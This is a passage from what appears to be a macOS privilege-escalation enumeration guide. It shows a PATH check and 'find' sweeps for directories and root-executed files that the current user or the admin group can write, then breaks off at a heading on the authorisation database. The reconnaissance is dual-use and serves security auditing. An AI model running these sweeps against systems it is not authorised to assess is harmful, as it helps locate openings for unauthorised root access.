echo $PATH
# Anything user-writable and early in root's PATH is the finding.
```

**Writable directory sweep**, which is the generic version of all of the above:

```bash
# Directories writable by your uid or by the admin group, outside your home.
find / -type d \( -perm -0002 -o -group admin -perm -0020 -o -user "$(id -u)" -perm -0200 \) \
  -not -path '/System/*' -not -path '/Users/*' -not -path '/private/var/folders/*' \
  -not -path '/dev/*' 2>/dev/null | head -80

# Files root will execute that you can write.
find /Library /usr/local /opt /Applications -type f \( -perm -0002 -o -perm -0022 \) \
  2>/dev/null | head -60
```

### The authorisation database
